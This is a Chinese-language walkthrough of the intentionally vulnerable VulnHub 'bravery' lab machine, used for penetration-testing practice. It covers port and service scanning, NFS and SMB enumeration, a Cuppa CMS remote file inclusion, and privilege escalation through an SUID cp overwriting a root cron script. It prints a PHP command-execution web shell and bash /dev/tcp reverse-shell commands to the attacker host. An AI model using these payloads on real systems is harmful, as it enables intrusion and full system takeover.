#  vulnhub靶场之【digitalworld.local系列】的bravery靶机   
原创 whitehe  泷羽sec-何生安全   2025-03-03 00:30  
  
# 前言  
  
靶机：digitalworld.local-bravery  
，IP地址为192.168.10.8  
  
攻击：kali  
，IP地址为192.168.10.6  
  
kali  
采用VMware  
虚拟机，靶机采用virtualbox  
虚拟机，网卡都为桥接模式  
  
这里官方给的有两种方式，一是直接使用virtualbox  
加载，另一种是通过VMware  
挂载磁盘，也给出了iso  
镜像文件  
> ❝  
> 文章中涉及的靶机，来源于vulnhub  
官网，想要下载，可自行访问官网下载，或者在本公众号回复 digital  
 获取下载链接  
> ❞  
  
# 主机发现  
  
使用arp-scan -l  
或netdiscover -r 192.168.10.1/24  
扫描  
  
也可以使用nmap  
等工具进行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcDt2WEku4tZCWoYic9nj5XQFd53BqnOt39yvHxy8q09AOgGDnzOmRiaVA/640?wx_fmt=jpeg&from=appmsg "")  
# 信息收集  
## 使用nmap扫描端口  
```
nmap -sV -O 192.168.10.8 -p- -T4

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcAscoEodraBibUibVnuVnISaLHrldbBEEpxxnkBlujvepBmLTWM44zMWw/640?wx_fmt=jpeg&from=appmsg "")  
  
这是全面扫描，不过尽量更详细一点，先扫描tcp  
端口  
```
nmap -sT 192.168.10.8 -p- -T4 -oA nmap_tcp

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcJJiahnodlgaRvDCH7srwNviaJKpBJHnXCroFbL81WPopLVE0ZiaEFxVkg/640?wx_fmt=jpeg&from=appmsg "")  
  
扫描udp  
的top  
20端口  
```
nmap -sU 192.168.10.8 --top-ports 20 -T4

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcyGdmztDonZBbqg2n7tjhaDMmwWaibbickU7DxCVUNj8MC7OOFCMAAfag/640?wx_fmt=jpeg&from=appmsg "")  
  
这里的udp  
和tcp  
端口处于open  
的无差，所以，采用tcp  
的端口，并进行端口选择  
```
grep open nmap-tcp.nmap | awk -F'/' '{print $1}' | paste -sd ','

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcEwrSO8icSH9k4gXYq9hsFICMiacVbzVowvqXGx2rk5mw3bBcWuB6Q9mA/640?wx_fmt=jpeg&from=appmsg "")  
  
再对这些端口进行深一步的检测，比如检测服务等  
```
ports=22,53,80,111,139,443,445,2049,3306,8080,20048,37191,49742
nmap -sV -O -sC -sT 192.168.10.8 -p $ports -oA detail

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcNic8GiaTibrN7QkQ5F2d7nunib6Zg29ribN3DZFj7r2xhT86kKk9foQDYWQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc8zUcM15zo6QDibzyXs8IRBmMp2P0zicRlr9sx1IP1N3MIjSbZLIiaaRyg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcGIJibMXTpicZoMtILGSsWY8aW7foOy0dKeZzJAkVMplDcAgyvbbQWopg/640?wx_fmt=jpeg&from=appmsg "")  
  
再通过nmap的脚本扫描有无漏洞  
```
nmap --script=vuln -p $ports -oA vuln

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXccCtF6vbwLicH63Mk74VxLCNHichIXGmdLW9Ly0yW8WlqxQib8V7HkibDqw/640?wx_fmt=jpeg&from=appmsg "")  
  
根据以上收集的信息，有网站，有smb  
等，那么就一步一步来，大部分靶机都是从web  
开始，一步步推进  
## 网站信息收集  
### 80端口网站探测  
  
访问80端口的网站，并未有内容，应该是测试网站  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcMQFrP7OUdjKv0ibsXXoehtsRFaoR8zWubUYO2jz6QmtiaBF9A4R6fRvQ/640?wx_fmt=jpeg&from=appmsg "")  
  
查看页面源代码后，也并未有信息，使用浏览器插件wappalyzer  
或者whatweb  
测试该网站，发现具有php  
语言，采用apache  
，与前面nmap  
扫描收集的信息一样  
  
那么针对该80网站进行网站目录爆破，这里采用gobuster  
工具，也可以使用其他工具，很多  
```
gobuster dir -u http://192.168.10.8 -w /usr/share/wordlists/dirb/big.txt -x php,bak,txt,js,html -b 403-404

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcVMdy9aa0LdKV7kGqbDDEza9dSAibmTAiaRE01men0zf0zYEpF2udUQjw/640?wx_fmt=jpeg&from=appmsg "")  
  
这里的/0  
到/9  
都只是数字，访问README.txt  
，提示努力  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcb4kfLVY2ku4QoU8bSwDSJQiatRaXoiazF7UL3ZdTVDVMqB2sWMJQdQfQ/640?wx_fmt=jpeg&from=appmsg "")  
  
访问/about  
，给出一个链接，并说这里有提示  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc44alWphxgKUXfN2zywCj4yd45hROxu7qBYWuYiaWFlW1z1hmzPia0q0g/640?wx_fmt=jpeg&from=appmsg "")  
  
访问uploads  
，这里虽然有文件夹，但是里面没有任何东西  
  
再访问phpinfo.php  
，但是并不是真正的phpinfo  
界面，是空白  
  
之前给出的链接中，直接访问是不存在的界面，那么进行拼接呢  
```
http://192.168.10.8/1075692/Try-Harder
或
http://192.168.10.8/1075692
或
http://192.168.10.8/Try-Harder

```  
  
访问后，有一张图片，大概就是说，"还需努力啊，少年！"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcuTEC1BFVT90ic4P1AHnS34OR0nL1zhQe6v8gIMO1l96XORiaFdchcQIQ/640?wx_fmt=jpeg&from=appmsg "")  
  
既然如此，好嘛，我就转换方向，我去8080网站看看，嘿嘿嘿  
### 8080端口网站探测  
  
访问8080端口默认界面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcRQYcxjaWwMy4ctTmFHMwTENiaurCciatS3ibIwEq5ibc9iab5kNOOsOUwSQ/640?wx_fmt=jpeg&from=appmsg "")  
  
查看页面源代码，也并未发现隐藏信息  
  
使用gobuster  
等工具进行目录爆破  
```
gobuster dir -u http://192.168.10.8:8080 -w /usr/share/wordlists/dirb/big.txt -x php,bak,txt,js,html -b 403-404

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXccR0RXaROamDaENzr7gFXPJqrZlyrlntia0rqvrVQARIfFBdibd7zmI0w/640?wx_fmt=jpeg&from=appmsg "")  
  
先访问robots.txt  
，发现与前面爆破的路径，大部分都是一样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcibzr17l1X4Ixicw8llWSwq9QFicCoDovpfaVrJK8VVQGtA6bFuMKicwz2A/640?wx_fmt=jpeg&from=appmsg "")  
  
访问/cgi-bin  
和404.html  
都是一样的界面显示，不过这里也是得知一些信息，为nignx  
管理，并且配置文件的路径也给出了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcdfDZ0ztZFTByjhnaGCeZcEym1osX5X7dSxB4gjhOyx7DSRrSsg6grg/640?wx_fmt=jpeg&from=appmsg "")  
  
访问private  
，是以nginx  
默认的403界面显示  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcfa2qYZD8LZZ8ochNy1HQYpW9WTMxUUoQVWWUYXib11JTKxucEDqictEg/640?wx_fmt=jpeg&from=appmsg "")  
  
访问public  
，是一个常见的网站类型  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcelryPpgPWtgyoOiaub6LG2FfXXfuAgQMAf3NxjbuEMA3nTI0DTYrfbA/640?wx_fmt=jpeg&from=appmsg "")  
  
再次对这个网站进行扫描  
```
gobuster dir -u http://192.168.10.8:8080/public -w /usr/share/wordlists/dirb/big.txt -x php,bak,txt,js,html -b 403-404

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcJONQZyhFzUTS7KdPEUavcSt9588rXxjIzDc8casdm9bWvsLoof86gw/640?wx_fmt=jpeg&from=appmsg "")  
  
发现mail.php  
，不过访问这个文件，是直接下载的，所以可能这个网站对于php  
文件并不能解析  
  
访问qwertyuiop.html  
，发现是一张图片，图片中的英文就是提示  
  
sometimes,what you seek is hiding in planin sight  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcvUUcMvp7j3XNrfib3eqdnBtw6kP1Dic3cIa5VjDGxjqWcCgXxdKknJmA/640?wx_fmt=jpeg&from=appmsg "")  
  
下载图片，然后使用exiftool、binwalk、steghide  
等工具查看是否有隐写内容，测试发现并没有  
  
到这里，对于网站探测已经over  
了，除非就是网站爆破时，字典的问题了  
## nfs探测  
  
在之前，使用nmap  
扫描的时候，发现rpcbind  
和nfs  
，一般这两个都是搭配使用的  
  
那么使用nmap  
的脚本再进行一次探测  
```
nmap 192.168.10.8 --script=nfs*

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcyE6picVLTXc6oH0s8CMGxmoTomsicqresFxibeRibc5Mfib5gxEL27OmhPg/640?wx_fmt=jpeg&from=appmsg "")  
  
有东西，那么进一步深入，使用showmount  
查看  
```
showmount -e 192.168.10.8

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcz1GgUxYW2IQ529smeq8aI3ibs490jnDJ2EmzQHK326tibhE72u9uR4HA/640?wx_fmt=jpeg&from=appmsg "")  
  
可以看到，目标靶机确实是有，那么尝试直接挂载到kali  
进行测试是否可行  
```
mkdir share
mount -t nfs 192.168.10.8:/var/nfsshare ./share

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcDX0cjZxExY5Q2jEJW6E1N6WxEvBvnJawG8RwNDqLndHvf5LA00GCfg/640?wx_fmt=jpeg&from=appmsg "")  
  
但是我查看了所有文件的内容，文件里面的内容，并没有任何有价值的  
  
直到我再次查看，发现qwertyuioplkjhgfdsazxcvbnm  
这个文件有意思，结合前面password.txt  
以及其本身的内容来看，我怀疑这是一个密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcogeic281tQJEcMHR6ZxwN5rr1S5t0cvn5nUMO2d027BRibuszYcEGia3A/640?wx_fmt=jpeg&from=appmsg "")  
## smb探测  
  
前面也是有相关的smb  
服务的开启，所以，需要进一步进行探测的  
  
使用nmap  
中的脚本探测  
```
nmap 192.168.10.8 --script=smb*

```  
  
枚举出三个分享IPC$、anonymous、secured  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcqPNqjj7aPZDMHiceUQXKibvEElJhVc7AW4ASmKBVibmt3hvlPWNBdUzuQ/640?wx_fmt=jpeg&from=appmsg "")  
  
枚举出anonymous  
分享中，有内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcZay17W8EkUvSGAGEfy3PqbtmK27nicqibvADGW4FKtqTRrGeAdibwKQCg/640?wx_fmt=jpeg&from=appmsg "")  
  
枚举出两个用户david、rick  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcv2QxNoxPTUtuYI0sAf6JDNASAW6UBrGE5niaYOLg7gPibZRzUF9SBF3A/640?wx_fmt=jpeg&from=appmsg "")  
  
再使用enum4linux  
枚举一下  
```
enum4linux 192.168.10.8 -a

```  
  
枚举出两个用户，与前面使用nmap  
一样  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcCwJ6NtKYzf6o6wHUghR2jjvv8EOgh8djlI7FW2b3WfV9nvtQXTVr3w/640?wx_fmt=jpeg&from=appmsg "")  
  
枚举出三个分享，也是和前面使用nmap  
出的结果一样  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc804ibTNcD6RvZETlbEfhZdKTBLk1expUlI42DBK01AB8tHMLuU1LY4g/640?wx_fmt=jpeg&from=appmsg "")  
## 信息总结  
  
当前获取到的信息有  
1. nfs  
中的一个可能疑似密码的东西  
  
1. smb  
枚举出的三个分享以及两个用户  
  
1. 网站中并未有明显信息，目前来看，需要从smb  
着手  
  
密码qwertyuioplkjhgfdsazxcvbnm  
  
分享anonymous、secured  
  
用户david、rick  
# 漏洞寻找  
  
根据前面的信息，尝试连接smb  
中的分享，可以使用smbclient  
或者smbmap  
都可以  
```
smbclient //192.168.10.8/anonymous -N
#-N  是指不使用密码登录，也就是以匿名形式登录

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcwOz6EhwRV4XicPwNYldGAkuypBJyggc8kfLicpaaV0Aia28a6ReaaxO5Q/640?wx_fmt=jpeg&from=appmsg "")  
  
因为readme.txt  
是英文，为了方便，翻译一下，表示这是一个临时的服务，这种情况在现实中确实有，不过这需要很长的潜伏  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXca4MVoET6NWlzNve8toaq9bvDq4FzCJJ6nLIzUuebGtnflQyofjb6Sg/640?wx_fmt=jpeg&from=appmsg "")  
  
然后再次以登录身份进行测试anonymous  
，发现也是一样的东西  
```
#密码  qwertyuioplkjhgfdsazxcvbnm
smbclient //192.168.10.8/anonymous -U david #成功登录
smbclient //192.168.10.8/anonymous -U rick #无法成功登录

```  
  
那么换另一个分享secured  
，这里想匿名登录是失败的  
```
#密码 qwertyuioplkjhgfdsazxcvbnm
smbclient //192.168.10.8/secured -U david #成功登录
smbclient //192.168.10.8/secured -U rick #无法成功登录

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcEpr0KVFJllmC3LBYeicibBCSUYvTIUD2wicxhlqdVpOic20licn8LYg9Nmg/640?wx_fmt=jpeg&from=appmsg "")  
  
获取三个文件，下载到kali  
，然后查看内容  
  
查看README.txt  
文件，这里明确提出了CMS  
，并且还搞出个单词goodtech  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXckeTwgNbPGo4UI83rAaRhYF2uvSgHBibtf3QXiaichgNicmLyvzbTRdTQnw/640?wx_fmt=jpeg&from=appmsg "")  
  
查看david.txt  
，提到域名，以及一个php  
的文件路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcO5wh701qDPlWflCsn0BibGjRDy4ibTiawHVmEmV1zbWLQ9r63ZibDZibWwQ/640?wx_fmt=jpeg&from=appmsg "")  
  
查看genevieve.txt  
文件，这里的信息提到一个地址http://192.168.254.155/genevieve  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcR2KFnvjYhwQMPc0gicee7bpdTUXwsfaibibG60kNzCWqIGNmfheU74kdg/640?wx_fmt=jpeg&from=appmsg "")  
  
根据上面收集的信息，构造一些网站的可能性，这里是不包括绑定域名的情况  
```
http://192.168.10.8/devops/directortestpagev1.php
http://192.168.10.8:8080/devops/directortestpagev1.php

http://192.168.10.8/genevieve
http://192.168.10.8:8080/genevieve

```  
  
先尝试一下，发现访问成功一个，看网站的样子，应该是还在搭建中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXclUuvTCVDWSQ6HVDdSFuYSBARexy100aUmmfRLhuh7lvV6icr4EmGSzg/640?wx_fmt=jpeg&from=appmsg "")  
  
把能点的都点了，发现基本上都是页面不存在，不过发现一个功能，点击后，跳转到登录界面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc3InAOsqN5LmbTaX720ic2o3s2MiaFas9mtdrO0A4SYiaibicsIbbJ6Tvoicg/640?wx_fmt=jpeg&from=appmsg "")  
  
可以看到是CMS  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc1LMqegE8QhZGsVA1bDWqIalqepnwetk7YhZiaMzR4dnu1SKoFIzWmyw/640?wx_fmt=jpeg&from=appmsg "")  
  
以前面获取的信息，尝试进行登录，发现不行，包括刚获取的goodtech  
，把所有信息进行拼接，得出的用户名和密码，都无法登录，并且测试登录框，应该不存在注入  
# 漏洞利用  
  
那么使用searchsploit  
搜索，有无该CMS的漏洞cuppa  
```
searchsploit cuppa

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcqmoEhC2o8VlZS7mmGTvpIyAoxaESZ6Y9XXl4dFhVT0gTK3TIzmxBog/640?wx_fmt=jpeg&from=appmsg "")  
  
查看文档，发现用法，并且是文件包含，这个应该是cms  
构建时的代码原因  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXccMfCvcvJ3DvnbibbtbXiaDQ5bKicuTgme18wygnrDsqYrPCttQgMA0icaA/640?wx_fmt=jpeg&from=appmsg "")  
  
测试路径，并且确定是否可用，确实可以  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcBDtk6zO0dQcGicM0sRiaIv3vibkMRvS0dN8wl58DbNElHuDZHEoiawp9FA/640?wx_fmt=jpeg&from=appmsg "")  
  
那么就在kali  
本地创建一个php  
文件，使得其远程包含该文件，然后导致反弹shell  
  
这里先写一个简单的php  
代码，可执行system  
的命令  
```
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

```  
  
把这个代码写入shell.php  
文件，然后再kali  
中，使用python  
开启一个http  
服务，观察是否可行  
  
**「注意，一定不要把kali中的http服务关闭，因为远程代码执行需要调用的」**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc43eFV8jKXVfialDILUKDtMLmPEt6JL9UPBRpcGSrGnyqKS4o16wAGTg/640?wx_fmt=jpeg&from=appmsg "")  
  
可以看到，我们的代码确实通过远程执行了，所以这里就直接通过传参cmd  
反弹shell  
```
bash -i >& /dev/tcp/192.168.10.6/9999 0>&1
#需要进行url编码
bash%20-i%20%3e%26%20%2fdev%2ftcp%2f192.168.10.6%2f9999%200%3e%261

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcsQcypa2W8Lox5F6C4r9Dmib9zeoF0ujRMNvrFks0rfCPJWpGniaeWpow/640?wx_fmt=jpeg&from=appmsg "")  
# 提权  
## 靶机内信息收集  
  
查看网络连接  
```
ss -antlp

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcz70icJsVoia15f290Mj4ZsnlN0orSFrZVDyeK7SMAYZbESCsn6miadQyw/640?wx_fmt=jpeg&from=appmsg "")  
  
查看ip  
地址，确定当前是否处在虚拟环境，确实未处于虚拟环境  
```
ip add

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcGv5tcxOicX1hUHL4lxITSVvTbGTgiaXyW3sPox8Y6bOmakX3zssicU5Uw/640?wx_fmt=jpeg&from=appmsg "")  
  
查看以root  
的进程  
```
ps aux | grep root

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcY65TGDDWu8ibgX0n7XSksM1iaficw4f4cT6QdmoMzQouh1oVg7RglAU4w/640?wx_fmt=jpeg&from=appmsg "")  
  
查看内核版本以及系统版本  
```
uanme -a/-r
cat /etc/issue
cat /etc/*release

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc2ZMcVqpOE1Ra1y7T2lSQepJOictjx9jIeg4szOVddxsGCyEYic46RW1w/640?wx_fmt=jpeg&from=appmsg "")  
  
使用find  
寻找具有SUID权限的文件  
```
find - perm -u=s -type f 2>/dev/null

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXchNYEJJ00AhwwgdKT2kP6k9KE6cyplck4Xoz74TAsMfcXHdkYJPdiaqQ/640?wx_fmt=jpeg&from=appmsg "")  
  
查看定时任务  
```
cat /etc/crontab

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcJlKkyhz6Bz3JEUyFfpf4H3JvPgkDMwWINnWFO4skQflTaWnrHicvXaA/640?wx_fmt=jpeg&from=appmsg "")  
  
查看网站中的配置文件，发现连接数据库的用户名和密码，并且以root  
连接的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc5sAJEYp9rBE06UjiaBvabwH4MZiahZ8WFvKbNXtZnLKev1mljnj7qLNg/640?wx_fmt=jpeg&from=appmsg "")  
  
瞬间就让人想到udf  
提权，不过还是需要进一步验证  
  
查看相关配置，可能确实可以udf  
提权  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcF1cw5LWibTSdm1oyYRKV52TqldC7oed6ssBqibyoug8HgG8nqeicu9epg/640?wx_fmt=jpeg&from=appmsg "")  
  
不过再尝试进行dumpfile  
时，这个是被拒绝了，还是不能udf  
提权  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXc81JyclH6hQUMzGq4Ttn94KWictVLMVNbTTjWDKnMt4UnxFKKibITHF0A/640?wx_fmt=jpeg&from=appmsg "")  
  
上传一些脚本检测吧，上传pspy64  
，执行后发现，有一个脚本每5分钟执行一次  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcgcRxNvAicPzCnSEtp8ib3F5LDQVgpib5sGicPO0nuvQc8ujnuRro6oFhvw/640?wx_fmt=jpeg&from=appmsg "")  
## 定时任务提权  
  
已知，有脚本定时以root  
身份执行，并且在前面寻找SUID权限文件时，有cp  
命令，那么就可以创建一个反弹shell  
的脚本，使用cp  
覆盖原本的定时任务，就可以获得一个root  
的反弹shell  
```
#先在kali开启监听
nc -lvnp 1234
#然后执行命令
cd /tmp  #这里可以创建文件
echo "/bin/bash -i >& /dev/tcp/192.168.10.6/1234 0>&1" > 1.sh
cat 1.sh #确保反弹shell命令写入
/usr/bin/cp 1.sh /var/www/maintenance.sh #开始使用具有SUID权限的cp进行覆盖
ls -l /var/www  #确保只有一个文件，也就是确保覆盖
cat /var/www/maintenance.sh  #再次确认，内容是否修改

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcYvmLw5rAbOyWzxpOOaia8FBSjqT8kKxo1JC9iac9UokwB3WW4H7QTtNA/640?wx_fmt=jpeg&from=appmsg "")  
  
等待一会，即可发现，获取到root  
的shell  
，这个时间大概5分钟  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/y4VoXticAsO6AOnJ4qTJwicCPfLobclXXcgAEYibaA8y0YKPUfJyZicpXVpE2Qd5aQsVVNbjA1zpVcAgdhPIGFYC6w/640?wx_fmt=jpeg&from=appmsg "")  
# 总结  
  
该靶机考察几点：  
1. 对于众多信息，要一步步去筛选，不要急躁。这里的网站信息刚开始可能确实没有，所以不要急躁  
  
1. 对于nfs  
这个要稍微了解，建议去ai  
搜索一下，这个经常配合rpcbind  
出现，并且，靶机内一般都是与showmount  
和挂载有关  
  
1. 对于smb  
服务，要会枚举，这里可以借助nmap  
的脚本，或者enum4linux  
或其他工具；枚举出之后，要会找到有用的信息，这里也就是**「密码」**  
的关键寻找  
  
1. 对于信息，要敏感，比如，如果是目录型网站，出现类似于目录的时候，要会拼接，这里因为出现的少，所以手工拼接即可，若是很多，要会自动化处理，也就是使用代码拼接目录，再通过工具批处理，选出可用的链接  
  
1. 对于提权，这里在获取到的平常信息，都无法提权时，可以借助工具观察，因为不可能每时每刻观察进程的命令，这也可能不显示  
  
1. 提权，要思路广，结合起来，这里就是想起cp  
命令来覆盖root  
执行的定时任务脚本  
  
  
  
  
